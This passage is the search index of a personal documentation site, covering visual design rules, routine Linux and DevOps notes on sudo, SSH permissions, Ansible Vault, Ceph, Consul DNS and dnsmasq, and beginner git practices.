{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to JamFox's docs","text":"<p>Welcome to my documentation playground, where I gather valuable bits and pieces for myself and potentially for others.</p> <p>Here's an overview of what's what:</p> <p>\ud83d\udda5\ufe0f HomeLab - Anything directly related to the homelab infrastructure.</p> <p>\ud83d\udc68\u200d\ud83d\udcbb DevOps - General technical system administration and devops documentation.</p> <p>\ud83c\udf72 Food &amp; Drinks - Anything related to food, drinks, cooking and recipes.</p> <p>\ud83d\udd17 Links - Links of all shapes and sizes, from interesting stuff I have found to other documentation.</p> <p>Extras - Other miscellaneous stuff.</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/","title":"Visual Design Rules You Can Safely Follow","text":"<p>Original article</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#use-near-black-and-near-white-instead-of-pure-black-and-white","title":"Use near-black and near-white instead of pure black and white","text":""},{"location":"content/design/visual-design-rules-you-can-safely-follow/#saturate-your-neutrals","title":"Saturate your neutrals","text":"<p>If nothing else, add just a hint of color to your near-black and near-white.</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#use-high-contrast-for-important-elements","title":"Use high contrast for important elements","text":""},{"location":"content/design/visual-design-rules-you-can-safely-follow/#everything-in-your-design-should-be-deliberate","title":"Everything in your design should be deliberate","text":"<p>Why is the font size as it is? How about letter spacing? Margins around different elements?</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#optical-alignment-is-often-better-than-mathematical-alignment","title":"Optical alignment is often better than mathematical alignment","text":"<p>Moreso for irregular shapes and elements.</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#measurements-should-be-mathematically-related","title":"Measurements should be mathematically related","text":"<p>Probably not always, but it many cases it can make the design feel more coherent. Is kind of at odds with the earlier optical vs mathematical alignment.</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#lower-letter-spacing-and-line-height-with-larger-text-raise-them-with-smaller-text","title":"Lower letter spacing and line height with larger text. Raise them with smaller text","text":"<p>The bigger the text, the less space you need between each letter and each line.</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#container-borders-should-contrast-with-both-the-container-and-the-background","title":"Container borders should contrast with both the container and the background","text":"<p>Border should be darker or brigther than both not something in the middle of the other elements.</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#everything-should-be-aligned-with-something-else","title":"Everything should be aligned with something else","text":"<p>If we want to feel like the elements are related to each other. Things that are aligned feel like they belong together and vice-versa.</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#colours-in-a-palette-should-have-distinct-brightness-values","title":"Colours in a palette should have distinct brightness values","text":"<p>It will feel like the colours don\u2019t compete with each other as much.</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#if-you-saturate-your-neutrals-you-should-use-warm-or-cool-colours-not-both","title":"If you saturate your neutrals you should use warm or cool colours, not both","text":""},{"location":"content/design/visual-design-rules-you-can-safely-follow/#elements-should-go-in-order-of-visual-weight","title":"Elements should go in order of visual weight","text":"<p>Left to right for westeners for example.</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#if-you-use-a-horizontal-grid-use-12-columns","title":"If you use a horizontal grid, use 12 columns","text":"<p>12 column grid can be broken up into 1 column, 2 columns, 3 columns, and 4 columns, so it gives you a lot of flexibility.</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#spacing-should-go-between-points-of-high-contrast","title":"Spacing should go between points of high contrast","text":""},{"location":"content/design/visual-design-rules-you-can-safely-follow/#closer-elements-should-be-lighter","title":"Closer elements should be lighter","text":"<p>Feels more natural because it simulates how light often bounces in real life.</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#make-drop-shadow-blur-values-double-their-distance-values","title":"Make drop shadow blur values double their distance values","text":""},{"location":"content/design/visual-design-rules-you-can-safely-follow/#put-simple-on-complex-or-complex-on-simple","title":"Put simple on complex or complex on simple","text":"<p>A complex background (e.g. a colourful gradient fill) works best if the foreground (e.g. text) is simple. (Remember the black car with color fade text vinyl in Need For Speed)</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#keep-container-colours-within-brightness-limits","title":"Keep container colours within brightness limits","text":"<p>The brightness difference between background and container should be within 12% for dark interfaces, and 7% for light interfaces.</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#make-outer-padding-the-same-or-more-than-inner-padding","title":"Make outer padding the same or more than inner padding","text":""},{"location":"content/design/visual-design-rules-you-can-safely-follow/#keep-body-text-at-16px-or-above","title":"Keep body text at 16px or above","text":"<p>16px is the default text size in most browsers.</p>"},{"location":"content/design/visual-design-rules-you-can-safely-follow/#use-a-line-length-around-70-characters","title":"Use a line length around 70 characters","text":""},{"location":"content/design/visual-design-rules-you-can-safely-follow/#make-horizontal-padding-twice-the-vertical-padding-in-buttons","title":"Make horizontal padding twice the vertical padding in buttons","text":""},{"location":"content/design/visual-design-rules-you-can-safely-follow/#use-two-typefaces-at-most","title":"Use two typefaces at most","text":""},{"location":"content/design/visual-design-rules-you-can-safely-follow/#nest-corners-properly","title":"Nest corners properly","text":""},{"location":"content/design/visual-design-rules-you-can-safely-follow/#dont-put-two-hard-divides-next-to-each-other","title":"Don\u2019t put two hard divides next to each other","text":""},{"location":"content/devops/","title":"DevOps","text":"<p>General technical system administration and devops documentation.</p>"},{"location":"content/devops/#linux","title":"Linux","text":"<p>General Linux tidbits.</p>"},{"location":"content/devops/#apt-upgrades-without-automatic-restarts","title":"APT upgrades without automatic restarts","text":"<p>On modern apt based systems if you wish to control the restarts better then you can export these vars before upgrade:</p> Text Only<pre><code>export DEBIAN_FRONTEND=noninteractive\nexport NEEDRESTART_MODE=l # l - list only, a - auto restart, i - interactive restart\n</code></pre>"},{"location":"content/devops/#sudo-and-root","title":"Sudo and root","text":"<p>You may see <code>sudo su -</code> used instead of <code>sudo -i</code> but there are some subtle differences between them. The <code>sudo su -</code> command sets up the root environment exactly like a normal login because the <code>su -</code> command ignores the settings made by sudo and sets up the environment from scratch. The default configuration of the <code>sudo -i</code> command actually sets up some details of the root user's environment differently than a normal login. For example, it sets the PATH environment variable slightly differently. This affects where the shell will look to find commands. You can make <code>sudo -i</code> behave more like <code>su -</code> by editing <code>/etc/sudoers</code> with <code>visudo</code>. Find the line</p> Text Only<pre><code>Defaults secure_path = /sbin:/bin:/usr/sbin:/usr/bin\n</code></pre> <p>and replace it with the following two lines:</p> Text Only<pre><code>Defaults secure_path = /usr/local/bin:/usr/bin\nDefaults&gt;root secure_path = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\n</code></pre> <p>For most purposes, this is not a major difference. However, for consistency of PATH settings on systems with the default <code>/etc/sudoers file</code>, it must be considered.</p>"},{"location":"content/devops/#ssh","title":"SSH","text":""},{"location":"content/devops/#fix-ssh-permissions","title":"Fix SSH permissions","text":"Bash<pre><code>find .ssh/ -type f -exec chmod 600 {} \\;; find .ssh/ -type d -exec chmod 700 {} \\;; find .ssh/ -type f -name \"*.pub\" -exec chmod 644 {} \\;\n</code></pre>"},{"location":"content/devops/#virtualization","title":"Virtualization","text":""},{"location":"content/devops/#check-nested-virtualization-support","title":"Check nested virtualization support","text":"<p>Intel: </p> <ul> <li><code>cat /sys/module/kvm_intel/parameters/nested</code></li> <li><code>modinfo kvm_intel | grep -i nested</code></li> </ul> <p>AMD: </p> <ul> <li><code>cat /sys/module/kvm_amd/parameters/nested</code></li> <li><code>modinfo kvm_amd | grep -i nested</code> </li> </ul>"},{"location":"content/devops/#disk","title":"Disk","text":""},{"location":"content/devops/#check-if-disk-is-ssd-or-hdd","title":"Check if disk is SSD or HDD","text":"Text Only<pre><code>lsblk -d -o name,rota\n</code></pre>"},{"location":"content/devops/#cpu-sockets-and-cores","title":"CPU sockets and cores","text":"<p>Only use first CPU socket for a task:</p> Bash<pre><code>numactl --cpubind=0 --membind=0 &lt;COMMAND&gt;\n</code></pre> <p>Check which cores are E-cores (efficiency cores) and run task only on P-cores (performance cores):</p> Bash<pre><code>cat /sys/devices/cpu_atom/cpus\n12-19\n\ntaskset -c 0-11 &lt;COMMAND&gt;\n</code></pre>"},{"location":"content/devops/ai-build/","title":"AI","text":"<ul> <li>AI on Demand EU</li> </ul>"},{"location":"content/devops/ansiblevault/","title":"Ansible Vault","text":"<p>Info</p> <p>Ansible Vault Documentation</p> <p>Ansible Vault is a feature that allows users to encrypt values and data structures within Ansible projects. This provides the ability to secure any sensitive data that is necessary to successfully run Ansible plays but should not be publicly visible, like passwords or private keys. Ansible automatically decrypts vault-encrypted content at runtime when the key is provided.</p> <p>This requires the manual step of setting up a password file and setting it's path (which should not be in the repository) in <code>ansible.cfg</code>.</p> <p>Using Anisble Vault means that managing secrets becomes as easy as managing the Ansible Vault password file and all other secrets can be set up automatically by running the playbooks.</p>"},{"location":"content/devops/ansiblevault/#usage","title":"Usage","text":"Bash<pre><code>[defaults]\nvault_password_file = &lt;PATH TO YOUR VAULT PASS&gt;\n</code></pre> <p>Secret variables can be set by encrypting strings:</p> Bash<pre><code>ansible-vault encrypt_string password123 \n</code></pre> <p>And pasting the output in place of a variable:</p> YAML<pre><code>my_password: !vault |\n    $ANSIBLE_VAULT;1.1;AES256\n    66386439653236336462626566653063336164663966303231363934653561363964363833\n    3136626431626536303530376336343832656537303632313433360a626438346336353331\n</code></pre> <p>View encrypted variable with:</p> Bash<pre><code>ansible localhost \\\n       -m debug \\\n       -a \"var=&lt;VAR NAME&gt;\" \\\n       -e \"@&lt;PATH TO VAR FILE&gt;\"\n</code></pre> <p>Encrypt files with:</p> Bash<pre><code>ansible-vault encrypt encrypt_me.txt\n</code></pre> <p>View encrypted files with:</p> Bash<pre><code>ansible-vault view encrypt_me.txt\n</code></pre> <p>Edit encrypted files with:</p> Bash<pre><code>ansible-vault edit encrypt_me.txt\n</code></pre> <p>Decrypt encrypted files with:</p> Bash<pre><code>ansible-vault decrypt encrypt_me.txt\n</code></pre>"},{"location":"content/devops/ceph/","title":"Ceph Storage","text":"<p>Info</p> <p>Ceph architecture docs  | Ceph Hardware recommendations | ceph-deep-dive</p>"},{"location":"content/devops/ceph/#architecture","title":"Architecture","text":"<p>Ceph architecture docs.</p> <p>Ceph provides an infinitely scalable Ceph Storage Cluster based upon RADOS, a reliable, distributed storage service that uses the intelligence in each of its nodes to secure the data it stores and to provide that data to clients.</p> <p>A Ceph Storage Cluster consists of multiple types of daemons:</p> <ul> <li>Ceph Monitor: maintain the master copy of the cluster map, which they provide to Ceph clients. The existence of multiple monitors in the Ceph cluster ensures availability if one of the monitor daemons or its host fails.</li> <li>Ceph OSD Daemon: checks its own state and the state of other OSDs and reports back to monitors.</li> <li>Ceph Manager: serves as an endpoint for monitoring, orchestration, and plug-in modules.</li> <li>Ceph Metadata Server: manages file metadata when CephFS is used to provide file services.</li> </ul> <p>Storage cluster clients and Ceph OSD Daemons use the CRUSH algorithm to compute information about the location of data. By using the CRUSH algorithm, clients and OSDs avoid being bottlenecked by a central lookup table.</p> <p>The Ceph Storage Cluster receives data from Ceph Clients--whether it comes through a Ceph Block Device, Ceph Object Storage, the Ceph File System, or a custom implementation that you create by using librados. The data received by the Ceph Storage Cluster is stored as RADOS objects. Each object is stored on an Object Storage Device (this is also called an \u201cOSD\u201d). Ceph OSDs control read, write, and replication operations on storage drives. The default BlueStore back end stores objects in a monolithic, database-like fashion.</p> <p>OSD is usually just a disk, but it can be some configuration of virtual abstraction (SSD split into 3 partitions providing journaling for 3 HDDs, where 1 OSD is 1 SSD partition + 1 HDD for example).</p> <p>Ceph OSD Daemons store data as objects in a flat namespace. This means that objects are not stored in a hierarchy of directories. An object has an identifier, binary data, and metadata consisting of name/value pairs. Ceph Clients determine the semantics of the object data. For example, CephFS uses metadata to store file attributes such as the file owner, the created date, and the last modified date.</p>"},{"location":"content/devops/ceph/#high-availability","title":"High-Availability","text":"<p>Ceph eliminates the centralized component. This enables clients to interact with Ceph OSDs directly. Ceph OSDs create object replicas on other Ceph Nodes to ensure data safety and high availability. Ceph also uses a cluster of monitors to ensure high availability. To eliminate centralization, Ceph uses an algorithm called CRUSH.</p> <p>A Ceph Client must contact a Ceph Monitor and obtain a current copy of the cluster map in order to read data from or to write data to the Ceph cluster.</p> <p>It is possible for a Ceph cluster to function properly with only a single monitor, but a Ceph cluster that has only a single monitor has a single point of failure: if the monitor goes down, Ceph clients will be unable to read data from or write data to the cluster.</p> <p>Ceph should be able to recover from a total disaster by itself.</p> <p>Ceph uses the Paxos consensus algorithm.</p> <p>Direct interactions between Ceph clients and OSDs require authenticated connections. The cephx authentication system establishes and sustains these authenticated connections.</p> <p>The <code>cephx</code> protocol operates in a manner similar to Kerberos.</p>"},{"location":"content/devops/ceph/#cluster-map","title":"Cluster Map","text":"<p>In order for a Ceph cluster to function properly, Ceph Clients and Ceph OSDs must have current information about the cluster\u2019s topology. Current information is stored in the \u201cCluster Map\u201d, which is in fact a collection of five maps. The five maps that constitute the cluster map are:</p> <ul> <li>The Monitor Map: Contains the cluster <code>fsid</code>, the position, the name, the address, and the TCP port of each monitor. The monitor map specifies the current epoch, the time of the monitor map\u2019s creation, and the time of the monitor map\u2019s last modification. To view a monitor map, run <code>ceph mon dump</code>.</li> <li>The OSD Map: Contains the cluster <code>fsid</code>, the time of the OSD map\u2019s creation, the time of the OSD map\u2019s last modification, a list of pools, a list of replica sizes, a list of PG numbers, and a list of OSDs and their statuses (for example, <code>up</code>, <code>in</code>). To view an OSD map, run <code>ceph osd dump</code>.</li> <li>The PG Map: Contains the PG version, its time stamp, the last OSD map epoch, the full ratios, and the details of each placement group. This includes the PG ID, the Up Set, the Acting Set, the state of the PG (for example, <code>active + clean</code>), and data usage statistics for each pool.</li> <li>The CRUSH Map: Contains a list of storage devices, the failure domain hierarchy (for example, <code>device</code>, <code>host</code>, <code>rack</code>, <code>row</code>, <code>room</code>), and rules for traversing the hierarchy when storing data. To view a CRUSH map, run <code>ceph osd getcrushmap -o {filename}</code> and then decompile it by running <code>crushtool -d {comp-crushmap-filename} -o {decomp-crushmap-filename}</code>.</li> <li>The MDS Map: Contains the current MDS map epoch, when the map was created, and the last time it changed. It also contains the pool for storing metadata, a list of metadata servers, and which metadata servers are <code>up</code> and <code>in</code>. To view an MDS map, execute <code>ceph fs dump</code>.</li> </ul> <p>Each map maintains a history of changes to its operating state. Ceph Monitors maintain a master copy of the cluster map. This master copy includes the cluster members, the state of the cluster, changes to the cluster, and information recording the overall health of the Ceph Storage Cluster.</p>"},{"location":"content/devops/ceph/#pools-pgs-osds","title":"Pools, PGs, OSDs","text":"<p>Each pool has a number of placement groups (PGs) within it. CRUSH dynamically maps PGs to OSDs. When a Ceph Client stores objects, CRUSH maps each RADOS object to a PG.</p> <p>PGs as a \u201clayer of indirection\u201d allows Ceph to rebalance dynamically when new Ceph OSD Daemons and their underlying OSD devices come online. </p> <p>Object locations must be computed. The client requires only the object ID and the name of the pool in order to compute the object location.</p> <p>When you add or remove a Ceph OSD Daemon to a Ceph Storage Cluster, the cluster map gets updated with the new OSD. Consequently, it changes object placement, because it changes an input for the calculations. Thus rebalancing is done (unless a flag was enabled to not rebalance).</p> <p>Ceph stores data in pools and there are two types of the pools: replicated or erasure-coded. By default: replicated. Ceph uses the replicated pools by default, meaning the Ceph copies every object from a primary OSD node to one or more secondary OSDs.</p> <p>An erasure coded pool stores each object as <code>K+M</code> chunks. It is divided into <code>K</code> data chunks and <code>M</code> coding chunks. The pool is configured to have a size of <code>K+M</code> so that each chunk is stored in an OSD in the acting set. The rank of the chunk is stored as an attribute of the object.</p> <p>For instance an erasure coded pool can be created to use five OSDs (<code>K+M = 5</code>) and sustain the loss of two of them (<code>M = 2</code>). Data may be unavailable until (<code>K+1</code>) shards are restored.</p> <p>The default erasure code profile (which is created when the Ceph cluster is initialized) will split the data into 2 equal-sized chunks, and have 2 parity chunks of the same size. It will take as much space in the cluster as a 2-replica pool but can sustain the data loss of 2 chunks out of 4. It is described as a profile with k=2 and m=2, meaning the information is spread over four OSD (k+m == 4) and two of them can be lost.</p>"},{"location":"content/devops/ceph/#planning-a-cluster","title":"Planning a cluster","text":"<p>Make sure you wrap your head around the RAM and CPU to OSD ratios. Generally, more RAM is better. Monitor / Manager nodes for a modest cluster might do fine with 64GB; for a larger cluster with hundreds of OSDs 128GB is advised. There is an <code>osd_memory_target</code> setting for BlueStore OSDs that defaults to 4GB. Factor in a prudent margin for the operating system and administrative tasks (like monitoring and metrics) as well as increased consumption during recovery: provisioning ~8GB per BlueStore OSD is thus advised.</p> <p>Do not deploy Ceph in production with less than five nodes. You need to keep Ceph under 80% full. When one of the nodes goes offline (e.g. failure or reboot), you are now working with 66% of the space. Of the 66%, you need to stay under 80% of that which is about 53% of the three node total. It is very easy to creep up and over 50% when everything is normal. Then be in a difficult place when you lose a node.</p> <p>Ceph can use different size disks, however the disks should be as uniform as possible between the nodes. Otherwise the smaller nodes will fill up faster and be unable to honor its CRUSH rules even if there is space left.</p>"},{"location":"content/devops/consul/","title":"Hashicorp Consul","text":"<p>Info</p> <p>Consul Homepage | Consul Docs | Consul Connect Docs | Envoy Proxy Homepage | Envoy Proxy Docs | Cloud Native Landscape</p> <p>Consul is a service networking solution that enables teams to manage secure network connectivity between services and across multi-cloud environments and runtimes. Consul offers service discovery, identity-based authorization, L7 traffic management, and service-to-service encryption.</p> <p>Consul's main power lies in:</p> <ul> <li>finding microservices easily to, for example, provide load balancing to multiple replicas of a containerized service.</li> <li>providing loosely coupled encrypted communication between (micro)services.</li> </ul>"},{"location":"content/devops/consul/#concepts","title":"Concepts","text":""},{"location":"content/devops/consul/#service-discovery","title":"Service discovery","text":"<p>Consul is used as a centralized registry that discovers, tracks, and monitors services. Consul can be the single source of truth for cataloging and maintaining a record of all services.</p> <p>Traditionally, applications and services tend to be static where IP's remain unchanged. However, this becomes a challenge with containerized/scalable applications that are much more dynamic. This is even more evident today with microservices that are ephemeral and constantly changing.</p> <p>Service discovery uses a service's identity instead of traditional access information (IP address and port). This allows dynamically mapping services and tracking any changes within a service catalog. Service consumers (users or other services) then use DNS to dynamically retrieve other service's access information from the service catalog.</p> <p>Discovery works by leveraging health checks. The check can be as simple as a HTTP call to the service, ping request, or something more sophisticated like launching an external program and analyzing its exit code. Then, depending on check result, Consul will put the service (or all services at the host) to one of the three states: healthy, warning or critical. <code>healthy</code> and <code>warning</code> services will behave like usual, but Consul gives special treatment for <code>critical</code> ones: they won't be discoverable via Consul DNS. What's even more, if service doesn't get back healthy in given amount of time, it can be unregistered completely. However, such behavior is disabled by default.</p>"},{"location":"content/devops/consul/#service-mesh","title":"Service mesh","text":"<p>Consul Connect enables simplified network topologies and management while also strengthening security and maintaining high performance in a distributed system.</p> <p>It works by adding Envoy Proxy sidecars to services. The sidecar service aims to add or augment an existing main service's functionality without changing the main service itself. The sidecar service starts and runs simultaneously with a main service.</p> <p>The advantage to the sidecar architecture is that the services being deployed do not need to be aware of the service mesh or the locations of the services that it needs to communicate with, instead all communication (including encrypting it and finding the services) is done by the sidecars, the services themselves are being told to look for communications on localhost. With a highly replicated/distributed/loosely coupled microservice architecture it is not feasible to keep updating ports and IPs of services so that they can communicate to each other because usually this architecture is built to be ephemeral (meaning the microservices can go down, do rolling updates, scale up or down), so the number of services and their IPs can and will change, sometimes even minute to minute. So instead, using Consul Connect allows telling any service to listen on localhost by connecting the sidecar to figure out and make everything that is needed for communication between services available to that service's localhost.</p>"},{"location":"content/devops/consul/#usage","title":"Usage","text":""},{"location":"content/devops/consul/#consul-dns-for-service-discovery","title":"Consul DNS for service discovery","text":"<p>After getting Consul up and running, it is possible to use port 8600 of Consul server nodes to query Consul's service catalog for healthy instances of those services. However this requires pointing services to the Consul instances on port 8600 or running Consul with an administrative or root account to serve it from port 53. A better, more dynamic way of resolving the Consul service catalog is to use DNS forwarding. This way the lab's internal DNS server passes requests from port 53 to Consul's DNS on 8600 as needed. This means not having to worry about clients that cannot deal with DNS being on a non-standard port, whilst also allowing them to lookup services from Consul.</p> <p>My choice of DNS is Dnsmasq and I am using a Debian based OS that uses systemd so there is a caveat of trying to figure out how to avoid a DNS lookup loop. The options are:</p> <ul> <li>disable <code>systemd-resolved</code> service</li> <li>use <code>systemd-resolved</code> instead of Dnsmasq</li> <li>point <code>systemd-resolved</code> to point to Dnsmasq</li> </ul> <p>After deciding on the appropriate setup it is a simple matter of adding another config file to <code>/etc/dnsmasq.d/</code> with the following contents:</p> Text Only<pre><code># Enable reverse DNS lookups for your netblock\nrev-server=192.168.0.0/24,127.0.0.1#8600\n\n# Enable forward lookup of the 'consul' domain to your consul server instances\nserver=/consul/192.168.0.120#8600\nserver=/consul/192.168.0.121#8600\nserver=/consul/192.168.0.122#8600\n</code></pre> <p>Some other optional settings that can be useful to add:</p> Text Only<pre><code># Accept DNS queries only from hosts whose address is on a local subnet.\nlocal-service\n\n# Don't poll /etc/resolv.conf for changes\nno-poll\n\n# Don't read /etc/resolv.conf\nno-resolv\n\n# Specify other DNS servers for queries not handled by consul\nserver=8.8.8.8\n\n# Increase the size of dnsmasq's cache\ncache-size=65536\n</code></pre> <p>Then restart Dnsmasq with <code>systemctl restart dnsmasq</code> et voila!</p> <p>Check to see if the names resolve by using <code>dig consul.service.consul</code> to query the addresses of active Consul server nodes or <code>&lt;YOUR SERVICE&gt;.service.consul</code> for active instances of whatever service you have in your Consul catalog:</p> Text Only<pre><code>;; QUESTION SECTION:\n;consul.service.consul.         IN      A\n\n;; ANSWER SECTION:\nconsul.service.consul.  0       IN      A       192.168.0.122\nconsul.service.consul.  0       IN      A       192.168.0.120\nconsul.service.consul.  0       IN      A       192.168.0.121\n</code></pre> <p>For testing purposes, you can shut down one of your instances of whatever you're querying and doing <code>dig</code> on it again to see that there should be one less answer:</p> Text Only<pre><code>;; QUESTION SECTION:\n;consul.service.consul.         IN      A\n\n;; ANSWER SECTION:\nconsul.service.consul.  0       IN      A       192.168.0.122\nconsul.service.consul.  0       IN      A       192.168.0.120\n</code></pre>"},{"location":"content/devops/gitbasics/","title":"Git For Beginners","text":"<p>Git solves the problem of tracking changes and this is useful regardless of whether you are working in a team or not. Imagine having saves and quick saves similar to video games, but for your code. This is in essence, what git will provide. You will be able to choose which save point (or commit in git's case) to go back to whenever needed. It's worth noting that git is not GitLab or GitHub which use git in their core and build on top of it. For working on any code, configuration or scripts my philosophy is this: if it's not on git, it doesn't exist.</p> <p>All following will demonstrate git using it's command line interface.</p>"},{"location":"content/devops/gitbasics/#creating-a-git-repositoryproject","title":"Creating a git repository/project","text":"<p>To very simply add version control using git, go to the directory of your choice and use <code>git init</code>. This will create a directory name <code>.git/</code> which you will never have to touch or modify (and probably never should). In <code>.git/</code> git will store all information about changes and the project.</p> <p></p>"},{"location":"content/devops/gitbasics/#adding-changes-to-the-project","title":"Adding changes to the project","text":"<p>After you have made some working changes that you wish to save first use the command <code>git add &lt;PATH TO FILE(S) YOU CHANGED&gt;</code></p> <p><code>git add</code> will start tracking the file(s) you specify, to save the changes use <code>git commit</code>.</p> <p><code>git commit</code> will open your default text editor, enter a message about what you changed and then git will store that commit message. If you wish to add a comment from the command line, use <code>git commit -m \"&lt;YOUR COMMIT MESSAGE&gt;\"</code></p> <p>But remember that you shouldn't delete other files if you wish to add changes to only a subset of files. A classmate once tried to delete all other files except the file she changed in our teams project. All unchanged files in the git project will just be there along for the ride, there is no reason to delete them. If you do delete them, then git will take that as you not needing the files any more and they will no longer be part of the project.</p>"},{"location":"content/devops/gitbasics/#traveling-in-time-with-git","title":"Traveling in time with git","text":"<p>After you've made multiple commits it is possible to travel in time to older and newer commits at your will.</p> <p></p> <p>You can check the log of commits using: <code>git log</code></p> <p>And then you can check out the commit you wish using: <code>git checkout &lt;COMMIT HASH&gt;</code></p> <p>So let's say that your friend did delete some files from your project, now you can undo that reverting the commit where the files were deleted!</p>"},{"location":"content/devops/gitbasics/#traveling-in-time-and-space-with-git","title":"Traveling in time AND space with git","text":"<p>Another powerful feature of git is the concept of branches. Creating a branch means creating another copy of your project inside the project itself with it's own change tracking. This is especially useful for just trying new changes out without breaking the code in the default branch.</p> <p>Usually there is a default branch, called \"main\" or \"master\". But there can be infinite number of other branches. So imagine if you and your friend each start working on new feature: you both create a new separate branch for each feature and then start working on them while each branch tracks only the changes relevant to each feature. This way the changes don't conflict, they are on separate branches!</p> <p></p> <p>Branches can be created using: <code>git branch &lt;NAME OF BRANCH&gt;</code></p> <p>Then you can go into that branch using: <code>git checkout &lt;NAME OF BRANCH&gt;</code></p> <p>Then commit changes as needed while staying on that branch and the changes will not be pushed into the default branch.</p> <p>Later when both are done with their feature, the branches can be merged back into the default branch using: <code>git merge</code></p> <p>Merging branches means taking changes from one branch and adding them to another. When two different branches change same things and are merged, there will be a merge conflict. To resolve the conflict, you must choose the changes from one or the other and then commit with the changes you chose.</p> <p></p>"},{"location":"content/devops/gitbasics/#example-project","title":"Example project","text":"<p>In a typical project you will see many different people working on many branches for type of change (feature, bug, hotfix and so on) and there will be a storm of merging going on constantly.</p> <p></p> <p>The best way to see a practical example would be to look at an open source project, like QMK Firmware as an example.</p>"},{"location":"content/devops/gitbasics/#advanced-git-wizard-tips","title":"Advanced git wizard tips","text":"<p>To make using git even easier, you can make aliases for git commands that you use often. There exist a lot of templates and existing setups that can be copied and adapted. For example with aliases you could use <code>gc</code> instead of <code>git commit</code>.</p> <p>Don't forget about <code>.gitignore</code> this is another special file that is not created by default. In this text file you can specify files and directories that git should ignore. Many projects have dependencies and routines that generate some kind of output, cache, local config files or otherwise some generated files. Save repository size and use .gitignore file to specify files that should not be tracked and pushed to the repository.</p> <p>Some other useful commands:</p> <p><code>git diff</code> - look at the difference between files or difference between changes or branches.</p> <p><code>git stash</code> - stashing changes saves them without commiting or adding the changes to tracking. Useful for when your changes are not finished, but you wish to quickly work on something else. Then later you can come back to the stashed changes with <code>git stash pop</code>.</p> <p><code>git blame</code> - with this command you can pinpoint who made a specific change. Most editors will have support to automatically show you who made the latest change to a line.</p> <p><code>git rebase</code> - with a rebase you can move a bunch of commits to a new base commit.</p>"},{"location":"content/devops/gitbasics/#cicd","title":"CI/CD","text":"<p>I mentioned that git is not GitLab or GitHub, however at one point or another you will be using git from a platform such as those. And what these platforms usually have is some sort of Continuous Integration and Continuous Deployment (CI/CD for short) tools such as GitLab CI/CD or GitHub Actions.</p> <p>CI/CD is used to automatically build, test, deploy, and monitor your applications to catch bugs and errors early in the development cycle.</p> <p>Manually deploying applications is time consuming and error-prone. With CI/CD you can automate that to avoid errors and save time in the process.</p> <p>On most platforms, each stage is executed by a docker container called Executor that is spawned by the Runner. After a stage is finished, the docker container for that Executor is destroyed.</p>"},{"location":"content/devops/gitdos/","title":"Git DOs and DONTs","text":""},{"location":"content/devops/gitdos/#do-use-branches","title":"DO use branches","text":"<p>The most important feature of git is its branching model. These branches are more like a new copy of your code's current state.</p> <p>Before you start working on a change create a new branch for it:</p> <ul> <li>branch for a new feature</li> <li>branch for bug fixes</li> <li>branch for some issue</li> </ul> <p>Benefits of branches:</p> <ul> <li>Easier to see which feature/bug/issue is being worked on</li> <li>Allows multiple people to work on multiple things at once</li> </ul>"},{"location":"content/devops/gitdos/#do-use-branch-naming-conventions","title":"DO use branch naming conventions","text":"<p>Branch naming conventions make it easier to see what feature/bug/issue is being worked on branches.</p> <p>All collaborators should agree on group words, separators and order of naming to use when naming branches. Usually the order of naming follows something along the lines of <code>&lt;issue type&gt; \u2192 &lt;concise issue description&gt; \u2192 &lt;issue ticket number&gt;</code></p> <p>Example (Yes, slashes can be used in branch names \ud83d\ude09):</p> <ul> <li>feature/offline-help/ROG-1234</li> <li>bug/crash-on-unsecure/ADM-1337</li> <li>issue/acc-py-deployment/LUL-0451</li> </ul> <p>Example 2:</p> <ul> <li>f-offline_help-ROG_1234</li> <li>b-crash_on_unsecure-ADM_1337</li> <li>i-acc_py_deployment-LUL_0451</li> </ul> <p>For some groups, 100% consistent naming is not as important, but it is important to use atleast some kind of convention.</p>"},{"location":"content/devops/gitdos/#do-atomic-commits","title":"DO atomic commits","text":"<p>Atomic commit is the smallest, most important improvement you can make in your source code.</p> <p>Atomic commit = one commit for one change.</p> <p>If you have made a change that works then commit it. Having periodic checkpoints like this means that you can understand how you broke something.</p> <p>The more changes you accumulate the harder it gets to track down the root cause of a breakage:</p> <p></p> <p>How to do atomic commits:</p> <ul> <li>By working on one thing at a time</li> <li>Keep your changes small</li> </ul> <p>Benefits of atomic commits:</p> <ul> <li>Easier to read</li> <li>Easier to track</li> <li>Easier to review</li> </ul>"},{"location":"content/devops/gitdos/#dont-commit-broken-code","title":"DON'T commit broken code","text":"<p>Atomic commits are great, but they should be commited only when the changes work. Remember, you are very likely working in collaboration with other people. Your collaborators might want or need to branch off of your commits (and maybe not necessarily the latest commit at that) and they will soon be pulling their hair out if they can not figure out why their changes are broken, when in reality it was rigged from the start.</p>"},{"location":"content/devops/gitdos/#do-squash-commits","title":"DO squash commits","text":"<p>Squashing commits melts all commits into the first one.</p> <p>This is especially important if you've changed a lot of things back and forth or done some nonesensical commits for testing. Anyone working with GitLab CI should understand the pain:</p> <p></p> <p>Doing atomic commits is good, but having a readable git log is also important. So when merging your changes from your appropriately named branch into the main branch, consider squashing your commits.</p> <p>For some groups squashing is something to be avoided to keep a very detailed log and preserve the benefits for atomic commits on the main branch. For other, especially larger groups, squashing commits is the only way to keep the git log readable and manageable. Having the freedom to do as many, even nonsensical commits, on your own branch is a necessary freedom, squashing on merge allows that freedom while preserving readability on the main branch.</p>"},{"location":"content/devops/gitdos/#do-use-a-commit-templatestyle","title":"DO use a commit template/style","text":"<p>Continuing with making the git log more readable, commit message templates are a great way to improve readability. There are many commit styles, so one has to be agreed 